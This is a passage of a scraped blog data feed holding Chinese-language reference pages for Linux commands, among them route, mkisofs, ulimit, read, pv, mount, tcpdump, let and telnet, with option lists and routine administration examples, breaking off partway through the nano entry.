添加网关/设置网关： route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0 #增加一条到达 244.0.0.0 的路由。 屏蔽一条路由： route add -net 224.0.0.0 netmask 240.0.0.0 reject #增加一条屏蔽的路由，目的地址为 224.x.x.x 将被拒绝。 删除路由记录： route del -net 224.0.0.0 netmask 240.0.0.0 route del -net 224.0.0.0 netmask 240.0.0.0 reject 删除和添加设置默认网关： route del default gw 192.168.120.240 route add default gw 192.168.120.240 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"route","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/route/","stats":{"text":"5 min read","time":241000,"words":900,"minutes":5},"date":"2022-02-03 15:02:09","dateFormat":"2022-02-03"},{"content":"建立 ISO 9660 映像文件。 补充说明 mkisofs 命令用来将指定的目录与文件做成 ISO 9660 格式的映像文件，以供刻录光盘。 语法 mkisofs (选项) (参数) 选项 -a 或--all：mkisofs 通常不处理备份文件。使用此参数可以把备份文件加到映像文件中； -A&lt;应用程序 id&gt;或-appid&lt;应用程序 ID&gt;：指定光盘的应用程序 ID； -abstract&lt;摘要文件&gt;：指定摘要文件的文件名； -b&lt;开机映像文件&gt;或-eltorito-boot&lt;开机映像文件&gt;：指定在制作可开机光盘时所需的开机映像文件； -biblio&lt;ISBN 文件&gt;：指定 ISBN 文件的文件名，ISBN 文件位于光盘根目录下，记录光盘的 ISBN； -c&lt;开机文件名称&gt;：制作可开机光盘时，mkisofs 会将开机映像文件中的全-eltorito-catalog&lt;开机文件名称&gt;全部内容作成一个文件； -C&lt;盘区编号，盘区编号&gt;：将许多节区合成一个映像文件时，必须使用此参数； -copyright&lt;版权信息文件&gt;：指定版权信息文件的文件名； -d 或-omit-period：省略文件后的句号； -D 或-disable-deep-relocation：ISO 9660 最多只能处理 8 层的目录，超过 8 层的部分，RRIP 会自动将它们设置成 ISO 9660 兼容的格式。使用-D 参数可关闭此功能； -f 或-follow-links：忽略符号连接； -h：显示帮助； -hide&lt;目录或文件名&gt;：使指定的目录或文件在 ISO 9660 或 Rock RidgeExtensions 的系统中隐藏； -hide-joliet&lt;目录或文件名&gt;：使指定的目录或文件在 Joliet 系统中隐藏； -J 或-joliet：使用 Joliet 格式的目录与文件名称； -l 或-full-iso9660-filenames：使用 ISO 9660 32 字符长度的文件名； -L 或-allow-leading-dots：允许文件名的第一个字符为句号； -log-file&lt;记录文件&gt;：在执行过程中若有错误信息，预设会显示在屏幕上； -m&lt;目录或文件名&gt;或-exclude&lt;目录或文件名&gt;：指定的目录或文件名将不会房入映像文件中； -M&lt;映像文件&gt;或-prev-session&lt;映像文件&gt;：与指定的映像文件合并； -N 或-omit-version-number：省略 ISO 9660 文件中的版本信息； -o&lt;映像文件&gt;或-output&lt;映像文件&gt;：指定映像文件的名称； -p&lt;数据处理人&gt;或-preparer&lt;数据处理人&gt;：记录光盘的数据处理人； -print-size：显示预估的文件系统大小； -quiet：执行时不显示任何信息； -r 或-rational-rock：使用 Rock Ridge Extensions，并开放全部文件的读取权限； -R 或-rock：使用 Rock Ridge Extensions； -sysid&lt;系统 ID&gt;：指定光盘的系统 ID； -T 或-translation-table：建立文件名的转换表，适用于不支持 Rock Ridge Extensions 的系统上； -v 或-verbose：执行时显示详细的信息； -V&lt;光盘 ID&gt;或-volid&lt;光盘 ID&gt;：指定光盘的卷册集 ID； -volset-size&lt;光盘总数&gt;：指定卷册集所包含的光盘张数； -volset-seqno&lt;卷册序号&gt;：指定光盘片在卷册集中的编号； -x&lt;目录&gt;：指定的目录将不会放入映像文件中； -z：建立通透性压缩文件的 SUSP 记录，此记录目前只在 Alpha 机器上的 Linux 有效。 参数 路径：需要添加到映像文件中的路径。 实例 linux 中用 mkisofs 命令把文件制作成 ISO 步骤： 把 NFS 服务器上的目录挂载到本地/mnt/nfs/的目录： mount -t nfs 10.0.2.2:/linuxos/rhel4.0_update3/ /mnt/nfs/ 把已挂载的文件复制到本地： cp -a /mnt/NFS/* /root/Decp -a /mnt/nfs/* /root/Desktop/rhel4.0/&amp;sktop/rhel4.0/&amp; 查找 boot.cat 文件并删除掉： find rhel4.0/ -name boot.cat | xargs rm 查找 TRANS.TBL 文件并删除掉： find rhel4.0/ -name TRANS.TBL -exec rm {} \\; 复制本地的所需文件到指定目录： cp /usr/share/comps/i386/.discinfo rhel4.0/ 把指定目录下的所有文件制作成 ISO 文件： mkisofs -R -J -T -v -no-emul-boot -boot-load-size 4 -boot-info-table -V RHEL4ASDVD -b isolinux/isolinux.bin -c isolinux/boot.cat -o /RHEL4AS.iso rhel4.0/ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mkisofs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mkisofs/","stats":{"text":"5 min read","time":262000,"words":1071,"minutes":5},"date":"2022-02-03 15:01:50","dateFormat":"2022-02-03"},{"content":"控制 shell 程序的资源。 补充说明 ulimit 命令用来限制系统用户对 shell 资源的访问。如果不懂什么意思，下面一段内容可以帮助你理解： 假设有这样一种情况，当一台 Linux 主机上同时登陆了 10 个人，在系统资源无限制的情况下，这 10 个用户同时打开了 500 个文档，而假设每个文档的大小有 10M，这时系统的内存资源就会受到巨大的挑战。 而实际应用的环境要比这种假设复杂的多，例如在一个嵌入式开发环境中，各方面的资源都是非常紧缺的，对于开启文件描述符的数量，分配堆栈的大 小，CPU 时间，虚拟内存大小，等等，都有非常严格的要求。资源的合理限制和分配，不仅仅是保证系统可用性的必要条件，也与系统上软件运行的性能有着密不可分的联 系。这时，ulimit 可以起到很大的作用，它是一种简单并且有效的实现资源限制的方式。 ulimit 用于限制 shell 启动进程所占用的资源，支持以下各种类型的限制：所创建的内核文件的大小、进程数据块的大小、Shell 进程创建文件的大小、内存锁住的大小、常驻内存集的大小、打开文件描述符的数量、分配堆栈的最大大小、CPU 时间、单个用户的最大线程数、Shell 进程所能使用的最大虚拟内存。同时，它支持硬资源和软资源的限制。 作为临时限制，ulimit 可以作用于通过使用其命令登录的 shell 会话，在会话终止时便结束限制，并不影响于其他 shell 会话。而对于长期的固定限制，ulimit 命令语句又可以被添加到由登录 shell 读取的文件中，作用于特定的 shell 用户。 语法 ulimit (选项) 选项 -a：显示目前资源限制的设定； -c &lt;core 文件上限&gt;：设定 core 文件的最大值，单位为区块； -d &lt;数据节区大小&gt;：程序数据节区的最大值，单位为 KB； -e 默认进程优先级, 值越小优先级越高 -f &lt;文件大小&gt;：shell 所能建立的最大文件，单位为区块； -H：设定资源的硬性限制，也就是管理员所设下的限制； -m &lt;内存大小&gt;：指定可使用内存的上限，单位为 KB； -n &lt;文件数目&gt;：指定同一时间最多可开启的文件数； -p &lt;缓冲区大小&gt;：指定管道缓冲区的大小，单位 512 字节； -s &lt;堆叠大小&gt;：指定堆叠的上限，单位为 KB； -S：设定资源的弹性限制； -t &lt;CPU 时间&gt;：指定 CPU 使用时间的上限，单位为秒； -u &lt;程序数目&gt;：用户最多可开启的程序数目； -v &lt;虚拟内存大小&gt;：指定可使用的虚拟内存上限，单位为 KB。 实例 [root@localhost ~]# ulimit -a core file size (blocks, -c) 0 #core 文件的最大值为 100 blocks。 data seg size (kbytes, -d) unlimited #进程的数据段可以任意大。 scheduling priority (-e) 0 file size (blocks, -f) unlimited #文件可以任意大。 pending signals (-i) 98304 #最多有 98304 个待处理的信号。 max locked memory (kbytes, -l) 32 #一个任务锁住的物理内存的最大值为 32KB。 max memory size (kbytes, -m) unlimited #一个任务的常驻物理内存的最大值。 open files (-n) 1024 #一个任务最多可以同时打开 1024 的文件。 pipe size (512 bytes, -p) 8 #管道的最大空间为 4096 字节。 POSIX message queues (bytes, -q) 819200 #POSIX 的消息队列的最大值为 819200 字节。 real-time priority (-r) 0 stack size (kbytes, -s) 10240 #进程的栈的最大值为 10240 字节。 cpu time (seconds, -t) unlimited #进程使用的 CPU 时间。 max user processes (-u) 98304 #当前用户同时打开的进程（包括线程）的最大个数为 98304。 virtual memory (kbytes, -v) unlimited #没有限制进程的最大地址空间。 file locks (-x) unlimited #所能锁住的文件的最大个数没有限制。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ulimit","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ulimit/","stats":{"text":"5 min read","time":241000,"words":1065,"minutes":5},"date":"2022-02-03 15:01:31","dateFormat":"2022-02-03"},{"content":"从键盘读取变量值。 补充说明 read 命令从键盘读取变量的值，通常用在 shell 脚本中与用户进行交互的场合。该命令可以一次读取多个变量的值，变量和输入的值都需要使用空格隔开。在 read 命令后面，如果没有指定变量名，读取的数据将被自动赋值给特定的变量 REPLY 语法 read (选项) (参数) 选项 -p：指定读取值时的提示符； -t：指定读取值时等待的时间（秒）。 参数 变量：指定读取值的变量名。 实例 下面的列表给出了 read 命令的常用方式： read 1987name 从标准输入读取输入并赋值给变量 1987name。 read first last 从标准输入读取输入到第一个空格或者回车，将输入的第一个单词放到变量 first 中，并将该行其他的输入放在变量 last 中。 read 从标准输入读取一行并赋值给特定变量 REPLY。 read -a arrayname 把单词清单读入 arrayname 的数组里。 read -p &quot;text&quot; 打印提示（text），等待输入，并将输入存储在 REPLY 中。 read -r line 允许输入包含反斜杠。 read -t 3 指定读取等待时间为 3 秒。 read -n 2 var 从输入中读取两个字符并存入变量 var，不需要按回车读取。 read -d &quot;:&quot; var 用定界符“:”结束输入行。 read 命令示例 从标准输入读取输入并赋值给变量 1987name。 #read 1987name #等待读取输入，直到回车后表示输入完毕，并将输入赋值给变量 answer HelloWorld #控制台输入 Hello #echo $1987name #打印变量 HelloWorld 等待一组输入，每个单词之间使用空格隔开，直到回车结束，并分别将单词依次赋值给这三个读入变量。 #read one two three 1 2 3 #在控制台输入 1 2 3，它们之间用空格隔开。 #echo &quot;one = $one, two = $two, three = $three&quot; one = 1, two = 2, three = 3 REPLY 示例 #read #等待控制台输入，并将结果赋值给特定内置变量 REPLY。 This is REPLY #在控制台输入该行。 #echo $REPLY #打印输出特定内置变量 REPLY，以确认是否被正确赋值。 This is REPLY -p 选项示例 #read -p &quot;Enter your name: &quot; #输出文本提示，同时等待输入，并将结果赋值给 REPLY。 Enter you name: stephen #在提示文本之后输入 stephen #echo $REPLY stephen 等待控制台输入，并将输入信息视为数组，赋值给数组变量 friends，输入信息用空格隔开数组的每个元素。 #read -a friends Tim Tom Helen #echo &quot;They are ${friends[0]}, ${friends[1]} and ${friends[2]}.&quot; They are Tim, Tom and Helen. 补充一个终端输入密码时候，不让密码显示出来的例子。 方法 1： #!/bin/bash read -p &quot;输入密码：&quot; -s pwd echo echo password read, is &quot;$pwd&quot; 方法 2： #!/bin/bash stty -echo read -p &quot;输入密码：&quot; pwd stty echo echo echo 输入完毕。 其中，选项-echo禁止将输出发送到终端，而选项echo则允许发送输出。 使用 read 命令从键盘读取变量值，并且将值赋给指定的变量，输入如下命令： read v1 v3 #读取变量值 执行上面的指令以后，要求键入两个数据，如下所示： Linux c+ #输入数据 完成之后，可以使用 echo 命令将指定的变量值输出查看，输入如下命令： echo $v1 $v3 #输出变量的值 执行输出变量值的命令以后，将显示用户所输入的数据值，如下所示： Linux c+ #输出变量值 注意：使用 echo 命令输出变量值时，必须在变量名前添加符号$。否则，echo 将直接输出变量名。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"read","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/read/","stats":{"text":"4 min read","time":222000,"words":955,"minutes":4},"date":"2022-02-03 15:01:03","dateFormat":"2022-02-03"},{"content":"显示当前在命令行执行的命令的进度信息，管道查看器。 补充说明 pv 命令 Pipe Viewer 的简称，由 Andrew Wood 开发。意思是通过管道显示数据处理进度的信息。这些信息包括已经耗费的时间，完成的百分比 (通过进度条显示)，当前的速度，全部传输的数据，以及估计剩余的时间。 下载安装 # Debian 系的操作系统，如 Ubuntu sudo apt-get install pv # RedHat 系的则这样： yum install pv 语法 pv (选项) (参数) pv [OPTION] [FILE]... 选项 -p, --progress show progress bar -t, --timer show elapsed time -e, --eta show estimated time of arrival (completion) -I, --fineta show absolute estimated time of arrival (completion) -r, --rate show data transfer rate counter -a, --average-rate show data transfer average rate counter -b, --bytes show number of bytes transferred -T, --buffer-percent show percentage of transfer buffer in use -A, --last-written NUM show NUM bytes last written -F, --format FORMAT set output format to FORMAT -n, --numeric 输出百分比 -q, --quiet do not output any transfer information at all -W, --wait display nothing until first byte transferred -D, --delay-start SEC display nothing until SEC seconds have passed -s, --size SIZE set estimated data size to SIZE bytes -l, --line-mode count lines instead of bytes -0, --null lines are null-terminated -i, --interval SEC update every SEC seconds -w, --width WIDTH assume terminal is WIDTH characters wide -H, --height HEIGHT assume terminal is HEIGHT rows high -N, --name NAME prefix visual information with NAME -f, --force output even if standard error is not a terminal -c, --cursor use cursor positioning escape sequences -L, --rate-limit RATE limit transfer to RATE bytes per second -B, --buffer-size BYTES use a buffer size of BYTES -C, --no-splice never use splice(), always use read/write -E, --skip-errors skip read errors in input -S, --stop-at-size stop after --size bytes have been transferred -R, --remote PID update settings of process PID -P, --pidfile FILE save process ID in FILE -d, --watchfd PID[:FD] watch file FD opened by process PID -h, --help 显示帮助 -V, --version 显示版本信息 实例 我们（在 linux 上使用命令行的用户）的大多数使用场景都会用到的命令是从一个 USB 驱动器拷贝电影文件到你的电脑。如果你使用 cp 来完成上面的任务，你会什么情况都不清楚，直到整个复制过程结束或者出错。 # 复制文件会有进度 linux [master●] % pv ~/Downloads/CentOS-7-x86_64-Minimal-1511.iso &gt; ~/Desktop/CentOS-7-x86_64-Minimal-1511.iso # 下面输入信息 552MiB 0:00:02 [ 212MiB/s] [==================&gt; ] 91% ETA 0:00:00 # -L 可以让你修改 pv 命令的传输速率。 # 使用 -L 选项来限制传输速率为 2MB/s。 pv -L 2m /media/himanshu/1AC2-A8E3/fNf.mkv &gt; ./Desktop/fnf.mkv # 字符一个个匀速在命令行中显示出来 echo &quot;Tecmint[dot]com is a community of Linux Nerds and Geeks&quot; | pv -qL 10 # 压缩文件展示进度信息 pv /media/himanshu/1AC2-A8E3/fnf.mkv | gzip &gt; ./Desktop/fnf.log.gz # 用 dd 命令将 iso 写入磁盘，pv 来实现进度条的显示 sudo pv -cN source &lt; /Users/kacperwang/Downloads/CentOS-7-x86_64-Everything-1511.iso | sudo dd of=/dev/disk2 bs=4m ## 显示下面进度 source: 5.2GiB 5:11:41 [ 503KiB/s] [=====================&gt; ] 71% ETA 2:01:56 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pv","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pv/","stats":{"text":"4 min read","time":213000,"words":714,"minutes":4},"date":"2022-02-03 14:44:20","dateFormat":"2022-02-03"},{"content":"用于加载文件系统到指定的加载点。 此命令的最常用于挂载 cdrom，使我们可以访问 cdrom 中的数据，因为你将光盘插入 cdrom 中，Linux 并不会自动挂载，必须使用 Linux mount 命令来手动完成挂载。 语法 mount [-hV] mount -a [-fFnrsvw] [-t vfstype] mount [-fnrsvw] [-o options [,...]] device | dir mount [-fnrsvw] [-t vfstype] [-o options] device dir 参数 -V：显示程序版本 -h：显示辅助讯息 -v：显示较讯息，通常和 -f 用来除错。 -a：将 /etc/fstab 中定义的所有档案系统挂上。 -F：这个命令通常和 -a 一起使用，它会为每一个 mount 的动作产生一个行程负责执行。在系统需要挂上大量 NFS 档案系统时可以加快挂上的动作。 -f：通常用在除错的用途。它会使 mount 并不执行实际挂上的动作，而是模拟整个挂上的过程。通常会和 -v 一起使用。 -n：一般而言，mount 在挂上后会在 /etc/mtab 中写入一笔资料。但在系统中没有可写入档案系统存在的情况下可以用这个选项取消这个动作。 -s-r：等于 -o ro -w：等于 -o rw -L：将含有特定标签的硬盘分割挂上。 -U：将档案分割序号为 的档案系统挂下。-L 和 -U 必须在/proc/partition 这种档案存在时才有意义。 -t：指定档案系统的型态，通常不必指定。mount 会自动选择正确的型态。 -o async：打开非同步模式，所有的档案读写动作都会用非同步模式执行。 -o sync：在同步模式下执行。 -o atime、-o noatime：当 atime 打开时，系统会在每次读取档案时更新档案的『上一次调用时间』。当我们使用 flash 档案系统时可能会选项把这个选项关闭以减少写入的次数。 -o auto、-o noauto：打开/关闭自动挂上模式。 -o defaults:使用预设的选项 rw, suid, dev, exec, auto, nouser, and async. -o dev、-o nodev-o exec、-o noexec允许执行档被执行。 -o suid、-o nosuid： 允许执行档在 root 权限下执行。 -o user、-o nouser：使用者可以执行 mount/umount 的动作。 -o remount：将一个已经挂下的档案系统重新用不同的方式挂上。例如原先是唯读的系统，现在用可读写的模式重新挂上。 -o ro：用唯读模式挂上。 -o rw：用可读写模式挂上。 -o loop=：使用 loop 模式用来将一个档案当成硬盘分割挂上系统。 实例 将 /dev/hda1 挂在 /mnt 之下。 mount /dev/hda1 /mnt 将 /dev/hda1 用唯读模式挂在 /mnt 之下。 mount -o ro /dev/hda1 /mnt 将 /tmp/image.iso 这个光碟的 image 档使用 loop 模式挂在 /mnt/cdrom之下。用这种方法可以将一般网络上可以找到的 Linux 光 碟 ISO 档在不烧录成光碟的情况下检视其内容。 mount -o loop /tmp/image.iso /mnt/cdrom ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mount","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mount/","stats":{"text":"3 min read","time":176000,"words":756,"minutes":3},"date":"2022-02-03 03:23:17","dateFormat":"2022-02-03"},{"content":"一款 sniffer 工具，是 Linux 上的抓包工具，嗅探器。 补充说明 tcpdump 命令是一款抓包，嗅探器工具，它可以打印所有经过网络接口的数据包的头信息，也可以使用-w选项将数据包保存到文件中，方便以后分析。 语法 tcpdump (选项) 选项 -a：尝试将网络和广播地址转换成名称； -c&lt;数据包数目&gt;：收到指定的数据包数目后，就停止进行倾倒操作； -d：把编译过的数据包编码转换成可阅读的格式，并倾倒到标准输出； -dd：把编译过的数据包编码转换成 C 语言的格式，并倾倒到标准输出； -ddd：把编译过的数据包编码转换成十进制数字的格式，并倾倒到标准输出； -e：在每列倾倒资料上显示连接层级的文件头； -f：用数字显示网际网络地址； -F&lt;表达文件&gt;：指定内含表达方式的文件； -i&lt;网络界面&gt;：使用指定的网络截面送出数据包； -l：使用标准输出列的缓冲区； -n：不把主机的网络地址转换成名字； -N：不列出域名； -O：不将数据包编码最佳化； -p：不让网络界面进入混杂模式； -q ：快速输出，仅列出少数的传输协议信息； -r&lt;数据包文件&gt;：从指定的文件读取数据包数据； -s&lt;数据包大小&gt;：设置每个数据包的大小； -S：用绝对而非相对数值列出 TCP 关联数； -t：在每列倾倒资料上不显示时间戳记； -tt： 在每列倾倒资料上显示未经格式化的时间戳记； -T&lt;数据包类型&gt;：强制将表达方式所指定的数据包转译成设置的数据包类型； -v：详细显示指令执行过程； -vv：更详细显示指令执行过程； -x：用十六进制字码列出数据包资料； -w&lt;数据包文件&gt;：把数据包数据写入指定的文件。 实例 直接启动 tcpdump 将监视第一个网络接口上所有流过的数据包 tcpdump 监视指定网络接口的数据包 tcpdump -i eth1 如果不指定网卡，默认 tcpdump 只会监视第一个网络接口，一般是 eth0，下面的例子都没有指定网络接口。 监视指定主机的数据包 打印所有进入或离开 sundown 的数据包。 tcpdump host sundown 也可以指定 ip,例如截获所有 210.27.48.1 的主机收到的和发出的所有的数据包 tcpdump host 210.27.48.1 打印 helios 与 hot 或者与 ace 之间通信的数据包 tcpdump host helios and \\( hot or ace \\) 截获主机 210.27.48.1 和主机 210.27.48.2 或 210.27.48.3 的通信 tcpdump host 210.27.48.1 and \\ (210.27.48.2 or 210.27.48.3 \\) 打印 ace 与任何其他主机之间通信的 IP 数据包, 但不包括与 helios 之间的数据包. tcpdump ip host ace and not helios 如果想要获取主机 210.27.48.1 除了和主机 210.27.48.2 之外所有主机通信的 ip 包，使用命令： tcpdump ip host 210.27.48.1 and ! 210.27.48.2 抓取 eth0 网卡上的包，使用: sudo tcpdump -i eth0 截获主机 hostname 发送的所有数据 tcpdump -i eth0 src host hostname 监视所有送到主机 hostname 的数据包 tcpdump -i eth0 dst host hostname 监视指定主机和端口的数据包 如果想要获取主机 210.27.48.1 接收或发出的 telnet 包，使用如下命令 tcpdump tcp port 23 and host 210.27.48.1 对本机的 udp 123 端口进行监视 123 为 ntp 的服务端口 tcpdump udp port 123 监视指定网络的数据包 打印本地主机与 Berkeley 网络上的主机之间的所有通信数据包 tcpdump net ucb-ether ucb-ether 此处可理解为“Berkeley 网络”的网络地址，此表达式最原始的含义可表达为：打印网络地址为 ucb-ether 的所有数据包 打印所有通过网关 snup 的 ftp 数据包 tcpdump 'gateway snup and (port ftp or ftp-data)' 注意：表达式被单引号括起来了，这可以防止 shell 对其中的括号进行错误解析 打印所有源地址或目标地址是本地主机的 IP 数据包 tcpdump ip and not net localnet 如果本地网络通过网关连到了另一网络，则另一网络并不能算作本地网络。 抓取 80 端口的 HTTP 报文，以文本形式展示： sudo tcpdump -i any port 80 -A ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tcpdump","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tcpdump/","stats":{"text":"5 min read","time":274000,"words":1181,"minutes":5},"date":"2022-02-02 16:43:17","dateFormat":"2022-02-02"},{"content":"简单的计算器，执行算术表达式。。 概要 let arg [arg ...] 主要用途 执行一个或多个算术表达式。 参数 arg：算术表达式 返回值 当let最后一个执行的表达式的计算结果为 0 时返回1，否则返回0。 当let执行的表达式的除数为 0 时，返回1并报错。 运算符优先级递减表 运算符 描述 id++, id-- 变量后增量、变量后减量 ++id, --id 变量预增量、变量预减量 -, + 正号、负号 !, ~ 逻辑否、按位取反 ** 幂运算 *, /, % 乘法、除法、取余 +, - 加法、减法 &lt;&lt;, &gt;&gt; 按位左移、右移 &lt;=, &gt;=, &lt;, &gt; 比较 ==, != 等于、不等于 &amp; 按位与 ^ 按位异或 | 按位或 &amp;&amp; 逻辑与 || 逻辑或 expr ? expr : expr 条件运算符（三元运算符） =, *=, /=, %=, +=, -=, &lt;&lt;=, &gt;&gt;=, &amp;=, ^=, |= 赋值 例子 # 尝试直接在终端中执行算术表达式（就像在 python 的 IDLE）。 3+4 bash：3+4：command not found... # 换一种方式。 3 + 4 bash：3：command not found... # 看来不行。 # let 命令赋值。 let a=3**4 echo ${a} # 显示 81。 # ((...)) 和 let 命令等效。 ((a=3**4)) # let 常用于变量赋值，而外部命令 expr 可直接返回表达式的值。 let 3+4 # 没有显示 7。 # 执行后显示 7，注意空格。 expr 3 + 4 # 条件表达式。 if ((8&gt;4)); then echo '8 is greater than 4.' else echo 'error' fi # 注意空格。 if [[ 12 -le 10 ]]; then echo 'error' else echo '12 is greater than 10.' fi # 可以通过 declare 命令设置整型属性的方法来进行算术运算。 # local 命令与此类似。 # 没有指定整型属性，输出为字符串 'a+b'。 declare a=3 b=4 c c=a+b echo ${c} # 不过可以使用以下方式赋值。 c=$((a+b)) echo ${c} # 显示 7 # 设置了整型属性就可以直接加了。 declare -i a=3 b=4 c c=a+b echo ${c} # 同上。 declare -i a a=2*3 echo ${a} # 显示 6。 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 执行算术计算的命令除了let，还有外部命令expr、bc等。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"let","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/let/","stats":{"text":"3 min read","time":132000,"words":530,"minutes":3},"date":"2022-02-02 16:42:07","dateFormat":"2022-02-02"},{"content":"登录远程主机和管理 (测试 ip 端口是否连通)。 补充说明 telnet 命令用于登录远程主机，对远程主机进行管理。telnet 因为采用明文传送报文，安全性不好，很多 Linux 服务器都不开放 telnet 服务，而改用更安全的 ssh 方式了。但仍然有很多别的系统可能采用了 telnet 方式来提供远程登录，因此弄清楚 telnet 客户端的使用方式仍是很有必要的。 语法 telnet (选项) (参数) 选项 -8：允许使用 8 位字符资料，包括输入与输出； -a：尝试自动登入远端系统； -b&lt;主机别名&gt;：使用别名指定远端主机名称； -c：不读取用户专属目录里的.telnetrc 文件； -d：启动排错模式； -e&lt;脱离字符&gt;：设置脱离字符； -E：滤除脱离字符； -f：此参数的效果和指定&quot;-F&quot;参数相同； -F：使用 Kerberos V5 认证时，加上此参数可把本地主机的认证数据上传到远端主机； -k&lt;域名&gt;：使用 Kerberos 认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名； -K：不自动登入远端主机； -l&lt;用户名称&gt;：指定要登入远端主机的用户名称； -L：允许输出 8 位字符资料； -n&lt;记录文件&gt;：指定文件记录相关信息； -r：使用类似 rlogin 指令的用户界面； -S&lt;服务类型&gt;：设置 telnet 连线所需的 ip TOS 信息； -x：假设主机有支持数据加密的功能，就使用它； -X&lt;认证形态&gt;：关闭指定的认证形态。 参数 远程主机：指定要登录进行管理的远程主机； 端口：指定 TELNET 协议使用的端口号。 实例 $ telnet 192.168.2.10 Trying 192.168.2.10... Connected to 192.168.2.10 (192.168.2.10). Escape character is '^]'. localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1) login: root Password: Login incorrect 一般情况下不允许 root 从远程登录，可以先用普通账号登录，然后再用 su -切到 root 用户。 $ telnet 192.168.188.132 Trying 192.168.188.132... telnet: connect to address 192.168.188.132: Connection refused telnet: Unable to connect to remote host 处理这种情况方法： 确认 ip 地址是否正确？ 确认 ip 地址对应的主机是否已经开机？ 如果主机已经启动，确认路由设置是否设置正确？（使用 route 命令查看） 如果主机已经启动，确认主机上是否开启了 telnet 服务？（使用 netstat 命令查看，TCP 的 23 端口是否有 LISTEN 状态的行） 如果主机已经启动 telnet 服务，确认防火墙是否放开了 23 端口的访问？（使用 iptables-save 查看） 启动 telnet 服务 service xinetd restart 配置参数，通常的配置如下： service telnet { disable = no #启用 flags = REUSE #socket 可重用 socket_type = stream #连接方式为 TCP wait = no #为每个请求启动一个进程 user = root #启动服务的用户为 root server = /usr/sbin/in.telnetd #要激活的进程 log_on_failure += USERID #登录失败时记录登录用户名 } 如果要配置允许登录的客户端列表，加入 only_from = 192.168.0.2 #只允许 192.168.0.2 登录 如果要配置禁止登录的客户端列表，加入 no_access = 192.168.0.{2,3,4} #禁止 192.168.0.2、192.168.0.3、192.168.0.4 登录 如果要设置开放时段，加入 access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P） 如果你有两个 IP 地址，一个是私网的 IP 地址如 192.168.0.2，一个是公网的 IP 地址如 218.75.74.83，如果你希望用户只能从私网来登录 telnet 服务，那么加入 bind = 192.168.0.2 各配置项具体的含义和语法可参考 xined 配置文件属性说明（man xinetd.conf） 配置端口，修改 services 文件： # vi /etc/services 找到以下两句 telnet 23/tcp telnet 23/udp 如果前面有#字符，就去掉它。telnet 的默认端口是 23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将 23 这个数字修改掉，改成大一点的数字，比如 61123。注意，1024 以下的端口号是 internet 保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。 启动服务： service xinetd restart ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"telnet","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/telnet/","stats":{"text":"5 min read","time":275000,"words":1158,"minutes":5},"date":"2022-02-02 16:40:43","dateFormat":"2022-02-02"},{"content":"字符终端文本编辑器。 补充说明 nano 是一个字符终端的文本编辑器，有点像 DOS 下的 editor 程序。它比 vi/vim 要简单得多，比较适合 Linux 初学者使用。某些 Linux 发行版的默认编辑器就是 nano。 nano 命令可以打开指定文件进行编辑，默认情况下它会自动断行，即在一行中输入过长的内容时自动拆分成几行，但用这种方式来处理某些文件可能会带来问题，比如 Linux 系统的配置文件，自动断行就会使本来只能写在一行上的内容折断成多行了，有可能造成系统不灵了。因此，如果你想避免这种情况出现，就加上-w选项吧。 语法 nano [选项 ] [[+行,列 ] 文件名 ]... 选项 -h, -? --help 显示此信息 +行,列 从所指列数与行数开始 -A --smarthome 启用智能 HOME 键 -B --backup 储存既有文件的备份 -C &lt;目录&gt; --backupdir=&lt;目录&gt; 用以储存独一备份文件的目录 -D --boldtext 用粗体替代颜色反转 -E --tabstospaces 将已输入的制表符转换为空白 -F --multibuffer 启用多重文件缓冲区功能 -H --historylog 记录与读取搜索/替换的历史字符串 -I --ignorercfiles 不要参考 nanorc 文件 -K --rebindkeypad 修正数字键区按键混淆问题 -L --nonewlines 不要将换行加到文件末端 -N --noconvert 不要从 DOS/Mac 格式转换 -O --morespace 编辑时多使用一行 -Q &lt;字符串&gt; --quotestr=&lt;字符串&gt; 引用代表字符串 -R --restricted 限制模式 -S --smooth 按行滚动而不是半屏 -T &lt;#列数&gt; --tabsize=&lt;#列数&gt; 设定制表符宽度为 #列数 -U --quickblank 状态行快速闪动 -V --version 显示版本资讯并离开 -W --wordbounds 更正确地侦测单字边界 -Y &lt;字符串&gt; --syntax=&lt;字符串&gt; 用于加亮的语法定义 -c --const 持续显示游标位置 -d --rebinddelete 修正退格键/删除键混淆问题 -i 